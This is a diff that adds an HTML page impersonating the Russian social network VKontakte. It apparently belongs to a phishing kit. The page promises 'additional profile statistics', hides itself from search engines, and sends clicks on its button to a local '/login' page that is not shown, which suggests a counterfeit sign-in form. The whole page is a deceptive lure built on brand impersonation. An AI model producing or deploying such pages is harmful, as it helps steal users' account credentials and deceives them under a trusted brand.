@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href=""><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                                                                    <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12z" fill="#45c045"></path><path d="M8 11a1 1 0 011 1v4a1 1 0 11-2 0v-4a1 1 0 011-1zm8-5a1 1 0 011 1v9a1 1 0 11-2 0V7a1 1 0 011-1zm-4 2.5a1 1 0 011 1V16a1 1 0 11-2 0V9.5a1 1 0 011-1z" fill="#fff"></path></svg>
+                <h1 class="title">Получите дополнительную статистику о вашем профиле</h1>
+                <p class="subtitle">Подробная статистика доступна только
+ для вашего профиля и включает информацию по реакции пользователей, 
+переходам и охвату. Статистику можно посмотреть как всего профиля, так и
+ для каждого поста в отдельности.
+                    <br><br>
+                    Подробная статистика доступна в настройках профиля.
+                </p>
+                <button type="button" class="button"><span>Получить статистику</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                    </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
